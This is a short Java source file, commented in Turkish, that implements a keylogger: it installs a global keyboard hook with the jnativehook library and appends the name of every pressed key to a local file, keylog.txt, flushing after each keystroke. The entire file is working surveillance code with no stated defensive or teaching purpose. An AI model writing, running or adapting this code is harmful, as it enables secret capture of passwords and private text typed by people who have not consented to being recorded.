package com.isee.elfi;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    private BufferedWriter writer;

    public KeyLogger() {
        try {
            writer = new BufferedWriter(new FileWriter("keylog.txt", true)); // Log dosyasını aç
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            // Tuş basıldığında log dosyasına yaz
            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
            writer.newLine(); // Yeni bir satıra geç
            writer.flush(); // Değişiklikleri kaydet
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // Tuş serbest bırakıldığında yapılacak işlemler (şu an boş)
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Tuş yazıldığında yapılacak işlemler (şu an boş)
    }

    public static void startKeylogger() {
        try {
            GlobalScreen.registerNativeHook(); // Global hook kaydı
            GlobalScreen.addNativeKeyListener(new KeyLogger()); // Dinleyici ekle
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        // Logger'ı başlat
        startKeylogger();
    }
}
